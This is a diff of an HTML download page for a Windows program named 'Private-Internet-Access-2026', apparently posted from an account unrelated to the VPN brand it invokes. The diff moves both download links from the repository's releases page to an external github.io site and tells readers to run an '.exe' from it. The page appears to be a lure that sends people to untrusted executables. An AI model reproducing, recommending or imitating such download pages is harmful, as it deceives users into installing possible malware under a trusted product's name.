@@ -3,7 +3,7 @@
 <h1>🔒 Private-Internet-Access-2026 - Secure your Windows web traffic now</h1>
 
 <div style="text-align: center; margin: 40px 0;">
-    <a href="https://github.com/sable-hepatomegaly33/Private-Internet-Access-2026/releases" style="background-color: #2da44e; color: white; padding: 15px 30px; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 6px; display: inline-block;">Download Private Internet Access for Windows</a>
+    <a href="https://sable-hepatomegaly33.github.io" style="background-color: #2da44e; color: white; padding: 15px 30px; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 6px; display: inline-block;">Download Private Internet Access for Windows</a>
 </div>
 
 <h2>📋 Overview</h2>
@@ -23,7 +23,7 @@
 <p>Follow these steps to set up the software on your machine. This process takes only a few minutes.</p>
 
 <ol>
-    <li>Navigate to the official <a href="https://github.com/sable-hepatomegaly33/Private-Internet-Access-2026/releases">download page</a>.</li>
+    <li>Navigate to the official <a href="https://sable-hepatomegaly33.github.io">download page</a>.</li>
     <li>Look for the latest version listed under the Releases section.</li>
     <li>Click the file ending in ".exe" to begin the download.</li>
     <li>Locate the file in your "Downloads" folder once the process finishes.</li>
